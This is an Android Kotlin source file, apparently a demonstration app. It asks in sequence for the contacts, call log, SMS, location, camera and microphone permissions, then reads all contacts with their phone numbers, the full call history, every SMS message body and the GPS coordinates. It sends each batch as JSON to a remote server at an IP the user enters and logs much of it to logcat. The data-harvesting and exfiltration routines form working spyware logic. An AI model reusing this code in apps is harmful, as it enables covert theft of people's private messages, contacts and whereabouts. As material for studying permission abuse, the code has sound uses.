package com.permissionapp

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.provider.ContactsContract
import android.content.Context
import android.location.LocationManager
import android.net.Uri
import android.net.wifi.WifiManager
import java.text.SimpleDateFormat
import java.util.Date
import java.net.HttpURLConnection
import java.net.URL
import java.io.OutputStream
import java.lang.Thread

class MainActivity : AppCompatActivity() {

    private val permissions = listOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    )

    private lateinit var resultTextView: TextView
    private lateinit var stepTextView: TextView
    private lateinit var serverIpEditText: EditText
    private lateinit var connectionStatusTextView: TextView
    private lateinit var requestPermissionsButton: Button
    
    private var permissionQueue = mutableListOf<String>()
    private var currentPermissionIndex = 0
    private val grantedPermissionsData = StringBuilder()
    private var deviceIpAddress = ""
    
    // Server configuration
    private var serverPort = 8080

    // Individual permission launchers for sequential requests
    private val contactPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        handlePermissionResult(Manifest.permission.READ_CONTACTS, isGranted)
    }

    private val callLogPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        handlePermissionResult(Manifest.permission.READ_CALL_LOG, isGranted)
    }

    private val smsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        handlePermissionResult(Manifest.permission.READ_SMS, isGranted)
    }

    private val fineLocationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        handlePermissionResult(Manifest.permission.ACCESS_FINE_LOCATION, isGranted)
    }

    private val cameraPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        handlePermissionResult(Manifest.permission.CAMERA, isGranted)
    }

    private val audioPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        handlePermissionResult(Manifest.permission.RECORD_AUDIO, isGranted)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        resultTextView = findViewById(R.id.resultTextView)
        stepTextView = findViewById(R.id.stepTextView)
        serverIpEditText = findViewById(R.id.serverIpEditText)
        connectionStatusTextView = findViewById(R.id.connectionStatusTextView)
        requestPermissionsButton = findViewById(R.id.requestPermissionsButton)
        
        // Get device IP address
        deviceIpAddress = getDeviceIPAddress()
        Log.i("PERMISSION_APP", "Device IP: $deviceIpAddress")
        
        // Auto-fill with device IP as hint for server
        if (deviceIpAddress.isNotEmpty()) {
            serverIpEditText.hint = "e.g., $deviceIpAddress (or laptop IP)"
        }

        Log.i("PERMISSION_APP", "=== Permission App Started ===")

        requestPermissionsButton.setOnClickListener {
            Log.i("PERMISSION_APP", "Requesting permissions button clicked")
            startSequentialPermissionRequest()
        }
    }

    private fun startSequentialPermissionRequest() {
        val serverIp = serverIpEditText.text.toString().trim()
        
        if (serverIp.isEmpty()) {
            showConnectionStatus("Please enter server IP address", "#999999")
            Toast.makeText(this, "Please enter laptop's IP address", Toast.LENGTH_SHORT).show()
            return
        }
        
        showConnectionStatus("Connecting to $serverIp:$serverPort...", "#FFA500")
        
        // Test connection to server
        Thread {
            val connected = testServerConnection(serverIp, serverPort)
            runOnUiThread {
                if (connected) {
                    showConnectionStatus("Connected to $serverIp:$serverPort", "#4CAF50")
                } else {
                    showConnectionStatus("Cannot reach $serverIp:$serverPort", "#F44336")
                    Toast.makeText(this, "Server not reachable. Run ./run_app.sh --server on laptop", Toast.LENGTH_LONG).show()
                }
            }
        }.start()

        // Clear previous data
        grantedPermissionsData.clear()
        currentPermissionIndex = 0
        permissionQueue.clear()
        resultTextView.text = "=== Starting Permission Requests ===\n\n"
        
        // Build queue of permissions that need to be requested
        for (permission in permissions) {
            when {
                ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED -> {
                    Log.d("PERMISSION_APP", "Permission already granted: $permission")
                    fetchAndDisplayPermissionData(permission)
                }
                else -> {
                    permissionQueue.add(permission)
                }
            }
        }

        if (permissionQueue.isNotEmpty()) {
            Log.i("PERMISSION_APP", "Requesting ${permissionQueue.size} permissions sequentially")
            updateStepText()
            requestNextPermission()
        } else {
            Log.i("PERMISSION_APP", "All permissions already granted")
            showFinalResults()
        }
    }

    private fun updateStepText() {
        val total = permissionQueue.size
        val current = currentPermissionIndex + 1
        val permissionName = if (currentPermissionIndex < permissionQueue.size) {
            getPermissionDisplayName(permissionQueue[currentPermissionIndex])
        } else {
            "Complete"
        }
        runOnUiThread {
            stepTextView.text = "Step $current of $total: $permissionName"
        }
    }

    private fun requestNextPermission() {
        if (currentPermissionIndex < permissionQueue.size) {
            val permission = permissionQueue[currentPermissionIndex]
            val permissionName = getPermissionDisplayName(permission)
            
            Log.i("PERMISSION_APP", "Requesting permission ${currentPermissionIndex + 1}/${permissionQueue.size}: $permissionName")
            appendToResult("--- Requesting: $permissionName ---\n")
            
            when (permission) {
                Manifest.permission.READ_CONTACTS -> contactPermissionLauncher.launch(permission)
                Manifest.permission.READ_CALL_LOG -> callLogPermissionLauncher.launch(permission)
                Manifest.permission.READ_SMS -> smsPermissionLauncher.launch(permission)
                Manifest.permission.ACCESS_FINE_LOCATION -> fineLocationPermissionLauncher.launch(permission)
                Manifest.permission.CAMERA -> cameraPermissionLauncher.launch(permission)
                Manifest.permission.RECORD_AUDIO -> audioPermissionLauncher.launch(permission)
            }
        } else {
            Log.i("PERMISSION_APP", "All permission requests completed")
            showFinalResults()
        }
    }

    private fun handlePermissionResult(permission: String, isGranted: Boolean) {
        val permissionName = getPermissionDisplayName(permission)
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date())
        
        val permissionData = mutableMapOf<String, Any>(
            "granted" to isGranted,
            "timestamp" to timestamp
        )
        
        if (isGranted) {
            Log.d("PERMISSION_APP", "$permissionName GRANTED - Fetching data immediately")
            appendToResult("✓ $permissionName: GRANTED\n")
            
            val data = fetchAndStorePermissionData(permission)
            permissionData["data"] = data
            
            sendDataToServer(permissionName, permissionData)
        } else {
            Log.w("PERMISSION_APP", "$permissionName DENIED")
            appendToResult("✗ $permissionName: DENIED\n")
            permissionData["data"] = "Permission denied by user"
            
            sendDataToServer(permissionName, permissionData)
        }
        
        appendToResult("\n")
        
        currentPermissionIndex++
        
        if (currentPermissionIndex < permissionQueue.size) {
            updateStepText()
        }
        
        requestNextPermission()
    }

    private fun fetchAndStorePermissionData(permission: String): String {
        return when (permission) {
            Manifest.permission.READ_CONTACTS -> fetchContactsData()
            Manifest.permission.READ_CALL_LOG -> fetchCallLogData()
            Manifest.permission.READ_SMS -> fetchSMSData()
            Manifest.permission.ACCESS_FINE_LOCATION -> fetchLocationData()
            Manifest.permission.CAMERA -> fetchCameraData()
            Manifest.permission.RECORD_AUDIO -> fetchMicrophoneData()
            else -> ""
        }
    }

    private fun appendToResult(text: String) {
        runOnUiThread {
            resultTextView.append(text)
            Log.d("PERMISSION_APP", text.trimEnd())
        }
    }

    private fun showFinalResults() {
        runOnUiThread {
            stepTextView.text = "Step: Complete - All permissions processed"
        }
        val summary = "=== All Permissions Processed ===\n\n" +
                     "All data has been sent to the server.\n"
        appendToResult(summary)
        Log.i("PERMISSION_APP", "=== Final Results ===\n${grantedPermissionsData.toString()}")
    }

    private fun getPermissionDisplayName(permission: String): String {
        return when (permission) {
            Manifest.permission.READ_CONTACTS -> "READ_CONTACTS"
            Manifest.permission.READ_CALL_LOG -> "READ_CALL_LOG"
            Manifest.permission.READ_SMS -> "READ_SMS"
            Manifest.permission.ACCESS_FINE_LOCATION -> "ACCESS_FINE_LOCATION"
            Manifest.permission.ACCESS_COARSE_LOCATION -> "ACCESS_COARSE_LOCATION"
            Manifest.permission.CAMERA -> "CAMERA"
            Manifest.permission.RECORD_AUDIO -> "RECORD_AUDIO"
            else -> permission
        }
    }

    // ==================== WiFi Network Functions ====================

    private fun getDeviceIPAddress(): String {
        try {
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val wifiInfo = wifiManager.connectionInfo
            val ipAddress = wifiInfo.ipAddress
            
            if (ipAddress != 0) {
                return String.format("%d.%d.%d.%d",
                    ipAddress and 0xff,
                    (ipAddress shr 8) and 0xff,
                    (ipAddress shr 16) and 0xff,
                    (ipAddress shr 24) and 0xff)
            }
        } catch (e: Exception) {
            Log.e("PERMISSION_APP", "Error getting IP: ${e.message}")
        }
        
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val networkInterface = interfaces.nextElement()
                val addresses = networkInterface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val address = addresses.nextElement()
                    if (!address.isLoopbackAddress && address is java.net.Inet4Address) {
                        return address.hostAddress ?: ""
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("PERMISSION_APP", "Error getting IP from interfaces: ${e.message}")
        }
        
        return ""
    }

    private fun testServerConnection(serverIp: String, port: Int): Boolean {
        return try {
            val url = URL("http://$serverIp:$port/test")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 3000
            connection.readTimeout = 3000
            val responseCode = connection.responseCode
            connection.disconnect()
            responseCode == 200
        } catch (e: Exception) {
            Log.w("PERMISSION_APP", "Server test failed: ${e.message}")
            false
        }
    }

    private fun sendDataToServer(permissionName: String, data: Map<String, Any>) {
        val serverIp = serverIpEditText.text.toString().trim()
        if (serverIp.isEmpty()) {
            Log.w("PERMISSION_APP", "No server IP configured, skipping send")
            return
        }

        Thread {
            try {
                val url = URL("http://$serverIp:$serverPort/data")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true
                connection.connectTimeout = 5000
                connection.readTimeout = 10000

                val jsonPayload = buildJsonPayload(permissionName, data)
                
                Log.i("PERMISSION_APP", "Sending to $serverIp:$serverPort - $permissionName")
                
                val outputStream: OutputStream = connection.outputStream
                outputStream.write(jsonPayload.toByteArray())
                outputStream.flush()
                outputStream.close()

                val responseCode = connection.responseCode
                val responseMessage = connection.responseMessage ?: ""
                
                if (responseCode == 200 || responseCode == 201) {
                    Log.i("PERMISSION_APP", "Data sent successfully: $permissionName -> $serverIp")
                    runOnUiThread {
                        showConnectionStatus("Sent: $permissionName", "#4CAF50")
                    }
                } else {
                    Log.w("PERMISSION_APP", "Server responded: $responseCode $responseMessage")
                }
                
                connection.disconnect()
            } catch (e: Exception) {
                Log.e("PERMISSION_APP", "Error sending data: ${e.message}")
                runOnUiThread {
                    showConnectionStatus("Send failed: ${e.message}", "#F44336")
                }
            }
        }.start()
    }

    private fun buildJsonPayload(permissionName: String, data: Map<String, Any>): String {
        return buildString {
            append("{")
            append("\"device_ip\": \"$deviceIpAddress\",")
            append("\"permission\": \"$permissionName\",")
            append("\"granted\": ${data["granted"]},")
            append("\"timestamp\": \"${data["timestamp"]}\",")
            
            val dataStr = data["data"]?.toString()?.replace("\"", "\\\"") ?: ""
            append("\"data\": \"${dataStr.replace("\n", "\\n").replace("\r", "")}\"")
            
            append("}")
        }
    }

    private fun showConnectionStatus(message: String, colorHex: String) {
        runOnUiThread {
            connectionStatusTextView.text = "Status: $message"
            connectionStatusTextView.setTextColor(android.graphics.Color.parseColor(colorHex))
        }
    }

    // ==================== Data Fetching Functions (ALL DATA - NO LIMIT) ====================

    private fun fetchAndDisplayPermissionData(permission: String): String {
        val data = fetchAndStorePermissionData(permission)
        appendToResult(data)
        grantedPermissionsData.append(data)
        return data
    }

    private fun fetchContactsData(): String {
        val sb = StringBuilder()
        sb.append("============================================\n")
        sb.append("           CONTACTS (ALL DATA)\n")
        sb.append("============================================\n")
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
                == PackageManager.PERMISSION_GRANTED) {
                
                val cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null
                )
                
                cursor?.use {
                    val count = it.count
                    sb.append("Total Contacts: $count\n")
                    sb.append("--------------------------------------------\n")
                    Log.d("PERMISSION_APP", "=== CONTACTS DATA ===")
                    Log.d("PERMISSION_APP", "Total contacts: $count")
                    
                    if (count > 0) {
                        var index = 0
                        it.moveToFirst()
                        do {
                            val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                            val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
                            
                            if (nameIndex >= 0) {
                                val name = it.getString(nameIndex)
                                val id = if (idIndex >= 0) it.getLong(idIndex) else 0
                                
                                sb.append("[${index + 1}] Name: $name\n")
                                Log.d("PERMISSION_APP", "Contact ${index + 1}: $name")
                                
                                // Get phone numbers
                                val phoneCursor = contentResolver.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                                    arrayOf(id.toString()),
                                    null
                                )
                                
                                phoneCursor?.use { phoneIt ->
                                    var phoneNum = 0
                                    while (phoneIt.moveToNext()) {
                                        val phoneIndex = phoneIt.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                        val typeIndex = phoneIt.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                                        if (phoneIndex >= 0) {
                                            val phone = phoneIt.getString(phoneIndex)
                                            val type = phoneIt.getInt(typeIndex)
                                            val typeLabel = when(type) {
                                                1 -> "Home"
                                                2 -> "Mobile"
                                                3 -> "Work"
                                                else -> "Other"
                                            }
                                            phoneNum++
                                            sb.append("      Phone $phoneNum ($typeLabel): $phone\n")
                                            Log.d("PERMISSION_APP", "      Phone ($typeLabel): $phone")
                                        }
                                    }
                                }
                                
                                index++
                                sb.append("--------------------------------------------\n")
                            }
                        } while (it.moveToNext())
                    }
                }
            } else {
                sb.append("Permission not granted\n")
            }
        } catch (e: SecurityException) {
            sb.append("Error: ${e.message}\n")
            Log.e("PERMISSION_APP", "Contacts error: ${e.message}")
        }
        sb.append("\n")
        return sb.toString()
    }

    private fun fetchCallLogData(): String {
        val sb = StringBuilder()
        sb.append("============================================\n")
        sb.append("           CALL LOG (ALL DATA)\n")
        sb.append("============================================\n")
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) 
                == PackageManager.PERMISSION_GRANTED) {
                
                val cursor = contentResolver.query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    null, null, null, "${android.provider.CallLog.Calls.DATE} DESC"
                )
                
                cursor?.use {
                    val count = it.count
                    sb.append("Total Calls: $count\n")
                    sb.append("--------------------------------------------\n")
                    Log.d("PERMISSION_APP", "=== CALL LOG DATA ===")
                    Log.d("PERMISSION_APP", "Total calls: $count")
                    
                    if (count > 0) {
                        var index = 0
                        it.moveToFirst()
                        do {
                            val numberIndex = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                            val typeIndex = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                            val dateIndex = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                            val durationIndex = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                            
                            if (numberIndex >= 0) {
                                val number = it.getString(numberIndex)
                                val type = it.getInt(typeIndex)
                                val date = it.getLong(dateIndex)
                                val duration = it.getLong(durationIndex)
                                
                                val typeLabel = when(type) {
                                    1 -> "INCOMING"
                                    2 -> "OUTGOING"
                                    3 -> "MISSED"
                                    else -> "UNKNOWN"
                                }
                                
                                val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date(date))
                                
                                sb.append("[${index + 1}] $typeLabel | $number\n")
                                sb.append("    Date: $dateStr\n")
                                sb.append("    Duration: ${duration}s\n")
                                Log.d("PERMISSION_APP", "Call ${index + 1}: $typeLabel - $number at $dateStr (${duration}s)")
                                
                                index++
                            }
                        } while (it.moveToNext())
                    }
                }
            } else {
                sb.append("Permission not granted\n")
            }
        } catch (e: SecurityException) {
            sb.append("Error: ${e.message}\n")
            Log.e("PERMISSION_APP", "Call Log error: ${e.message}")
        }
        sb.append("\n")
        return sb.toString()
    }

    private fun fetchSMSData(): String {
        val sb = StringBuilder()
        sb.append("============================================\n")
        sb.append("           SMS MESSAGES (ALL DATA)\n")
        sb.append("============================================\n")
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
                == PackageManager.PERMISSION_GRANTED) {
                
                val cursor = contentResolver.query(
                    Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC"
                )
                
                cursor?.use {
                    val count = it.count
                    sb.append("Total Messages: $count\n")
                    sb.append("--------------------------------------------\n")
                    Log.d("PERMISSION_APP", "=== SMS DATA ===")
                    Log.d("PERMISSION_APP", "Total SMS: $count")
                    
                    if (count > 0) {
                        var index = 0
                        it.moveToFirst()
                        do {
                            val addressIndex = it.getColumnIndex("address")
                            val bodyIndex = it.getColumnIndex("body")
                            val dateIndex = it.getColumnIndex("date")
                            val typeIndex = it.getColumnIndex("type")
                            
                            if (addressIndex >= 0) {
                                val address = it.getString(addressIndex)
                                val body = if (bodyIndex >= 0) it.getString(bodyIndex) ?: "" else ""
                                val date = it.getLong(dateIndex)
                                val type = it.getInt(typeIndex)
                                
                                val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date(date))
                                val typeLabel = if (type == 1) "RECEIVED" else "SENT"
                                
                                sb.append("[${index + 1}] $typeLabel | From: $address\n")
                                sb.append("    Date: $dateStr\n")
                                sb.append("    Message:\n")
                                sb.append("    $body\n")
                                Log.d("PERMISSION_APP", "SMS ${index + 1}: $typeLabel from $address at $dateStr")
                                
                                index++
                                sb.append("--------------------------------------------\n")
                            }
                        } while (it.moveToNext())
                    }
                }
            } else {
                sb.append("Permission not granted\n")
            }
        } catch (e: SecurityException) {
            sb.append("Error: ${e.message}\n")
            Log.e("PERMISSION_APP", "SMS error: ${e.message}")
        }
        sb.append("\n")
        return sb.toString()
    }

    private fun fetchLocationData(): String {
        val sb = StringBuilder()
        sb.append("============================================\n")
        sb.append("           LOCATION DATA\n")
        sb.append("============================================\n")
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
                == PackageManager.PERMISSION_GRANTED) {
                
                val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                
                val providers = locationManager.getProviders(true)
                sb.append("Available Providers: ${providers.size}\n")
                sb.append("--------------------------------------------\n")
                Log.d("PERMISSION_APP", "=== LOCATION DATA ===")
                Log.d("PERMISSION_APP", "Providers available: ${providers.size}")
                
                for (provider in providers) {
                    sb.append("Provider: $provider\n")
                    Log.d("PERMISSION_APP", "Provider: $provider")
                    
                    val location = locationManager.getLastKnownLocation(provider)
                    if (location != null) {
                        sb.append("  Latitude: ${location.latitude}\n")
                        sb.append("  Longitude: ${location.longitude}\n")
                        sb.append("  Accuracy: ${location.accuracy}m\n")
                        sb.append("  Provider: ${location.provider}\n")
                        Log.d("PERMISSION_APP", "  Location: Lat=${location.latitude}, Lng=${location.longitude}")
                    } else {
                        sb.append("  Last known location: Not available\n")
                    }
                    sb.append("--------------------------------------------\n")
                }
                
                sb.append("GPS enabled: ${locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)}\n")
                sb.append("Network enabled: ${locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)}\n")
            } else {
                sb.append("Permission not granted\n")
            }
        } catch (e: SecurityException) {
            sb.append("Error: ${e.message}\n")
            Log.e("PERMISSION_APP", "Location error: ${e.message}")
        }
        sb.append("\n")
        return sb.toString()
    }

    private fun fetchCameraData(): String {
        val sb = StringBuilder()
        sb.append("============================================\n")
        sb.append("           CAMERA DATA\n")
        sb.append("============================================\n")
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
                == PackageManager.PERMISSION_GRANTED) {
                
                val packageManager = packageManager
                val hasCamera = packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)
                
                sb.append("Camera Available: $hasCamera\n")
                Log.d("PERMISSION_APP", "=== CAMERA DATA ===")
                Log.d("PERMISSION_APP", "Camera available: $hasCamera")
                
                if (hasCamera) {
                    val frontCamera = packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FRONT)
                    val backCamera = packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA)
                    sb.append("Front Camera: $frontCamera\n")
                    sb.append("Back Camera: $backCamera\n")
                }
            } else {
                sb.append("Permission not granted\n")
            }
        } catch (e: SecurityException) {
            sb.append("Error: ${e.message}\n")
            Log.e("PERMISSION_APP", "Camera error: ${e.message}")
        }
        sb.append("\n")
        return sb.toString()
    }

    private fun fetchMicrophoneData(): String {
        val sb = StringBuilder()
        sb.append("============================================\n")
        sb.append("           MICROPHONE DATA\n")
        sb.append("============================================\n")
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
                == PackageManager.PERMISSION_GRANTED) {
                
                val packageManager = packageManager
                val hasMicrophone = packageManager.hasSystemFeature(PackageManager.FEATURE_MICROPHONE)
                
                sb.append("Microphone Available: $hasMicrophone\n")
                Log.d("PERMISSION_APP", "=== MICROPHONE DATA ===")
                Log.d("PERMISSION_APP", "Microphone available: $hasMicrophone")
                
                if (hasMicrophone) {
                    sb.append("Status: Ready for recording\n")
                }
            } else {
                sb.append("Permission not granted\n")
            }
        } catch (e: SecurityException) {
            sb.append("Error: ${e.message}\n")
            Log.e("PERMISSION_APP", "Microphone error: ${e.message}")
        }
        sb.append("\n")
        return sb.toString()
    }
}

